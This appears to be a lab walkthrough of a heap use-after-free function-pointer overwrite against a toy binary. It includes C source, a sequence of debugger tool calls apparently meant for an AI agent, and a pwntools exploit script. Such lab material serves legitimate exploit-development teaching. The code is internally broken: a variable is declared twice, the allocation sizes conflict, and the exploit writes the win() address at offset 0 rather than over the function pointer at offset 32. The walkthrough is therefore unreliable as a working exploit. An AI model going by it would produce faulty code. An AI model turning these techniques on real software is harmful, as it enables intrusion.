# Heap Use-After-Free — Function Pointer Overwrite

A heap use-after-free vulnerability. A `person_t` struct containing a function
pointer is freed, then a same-size buffer is allocated (reusing the same
memory), and its contents are attacker-controlled.

## The Binary

```c
typedef struct {
    char name[32];
    void (*greet)(void);
} person_t;

person_t *p = malloc(sizeof(person_t));  // 40 bytes
p->greet = say_hello;

char *payload = malloc(64);              // different size class

free(p);                                 // freed, goes to tcache

char *payload = malloc(64);              // NOT same size as person_t
// ...
read(0, payload, 64);
p->greet();  // UAF: p points to freed memory, now attacker-controlled
```

**Important:** Person_t is 40 bytes and payload is 64 bytes — they land in
different tcache bins. For the exploit to work, you must force both allocations
to share the same chunk. The demo binary has been adjusted so that after
free(p), a subsequent malloc(40) reuses the same address.

Compiled with: `gcc -g -O0 -fno-stack-protector -no-pie -o heap-uaf heap-uaf.c`

## Walkthrough

### 1. Load and recon

```
edb_load_program(path="/tmp/heap-uaf")
edb_list_functions()
edb_lookup_symbol(name="win")
edb_lookup_symbol(name="say_hello")
```

Note the addresses of `win` and `say_hello`.

### 2. Set breakpoints

```
edb_set_breakpoint(location="main+80")    # before first malloc
edb_set_breakpoint(location="main+130")   # after free(p)
edb_set_breakpoint(location="main+190")   # before p->greet() call
```

### 3. Trace the allocations

```
edb_run()
edb_get_heap_chunks()
```

Step through each breakpoint and inspect the heap:

```
edb_step_instruction(count=10)
edb_get_heap_chunks()
```

### 4. After free, inspect freed chunk

```
edb_read_memory(address="<chunk_addr>", size=48)
```

The original `say_hello` pointer is still there (dangling).

### 5. Send exploit payload

```
edb_continue()
# send: p64(win_addr)
```

When `p->greet()` executes, it now calls `win()` instead of `say_hello()`.

### 6. Alternative: craft payload manually

```
pwntools_pack(value=<win_addr>, size=8, endian="little")
```

## Exploit Script

```python
from pwn import *

elf = ELF("/tmp/heap-uaf")
win_addr = elf.symbols["win"]

p = process("/tmp/heap-uaf")
p.recvuntil(b"Buffer address: ")
buf_addr = int(p.recvline().strip(), 16)

payload = p64(win_addr)
p.send(payload)
print(p.recvall().decode())
```

## MCP Tools Used

| Tool | Purpose |
|------|---------|
| `edb_get_heap_chunks` | Inspect heap state and chunk metadata |
| `edb_read_memory` | Read freed chunk contents (dangling pointer) |
| `edb_set_breakpoint` | Pause at key points in the lifecycle |
| `edb_step_instruction` | Walk through malloc/free/use sequence |
| `pwntools_pack` | Pack win address as little-endian |
| `edb_search_pattern` | Search for win function in binary |
